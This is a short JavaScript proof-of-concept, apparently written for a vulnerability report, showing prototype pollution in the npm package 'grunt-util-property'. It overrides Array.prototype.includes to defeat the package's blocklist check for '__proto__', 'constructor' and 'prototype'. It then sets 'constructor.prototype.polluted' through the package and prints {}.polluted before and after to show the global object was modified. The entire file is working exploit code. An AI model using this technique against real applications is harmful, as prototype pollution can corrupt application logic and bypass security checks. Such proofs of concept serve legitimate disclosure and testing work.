Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
const grunt = require('grunt');
const a = require('grunt-util-property');
console.log({}.polluted);
let b = a(grunt);
b.call({}, 'constructor.prototype.polluted', 'yes');
console.log({}.polluted);